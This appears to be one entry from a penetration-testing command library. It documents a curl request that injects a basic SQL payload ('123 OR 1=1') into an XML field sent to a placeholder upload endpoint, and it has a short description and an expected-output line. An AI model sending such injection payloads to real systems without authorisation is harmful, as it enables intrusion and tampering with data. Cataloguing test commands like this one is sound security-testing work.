---
id: c-curl-sqli-basic
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123 OR
  1=1</MainAccount></xml>' http://target-subdomain.example.com/upload
tags:
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.283Z'
verified: false
validated: true
submitted: true
---
# curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123 OR 1=1</MainAccount></xml>' http://target-subdomain.example.com/upload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123 OR 1=1</MainAccount></xml>' http://target-subdomain.example.com/upload
```

## Description

Tests basic SQLi in XML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | SQL payload | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

Altered response indicating injection.

## Related

- [[procedures/Test-SQL-Injection-in-XML-Nodes]]
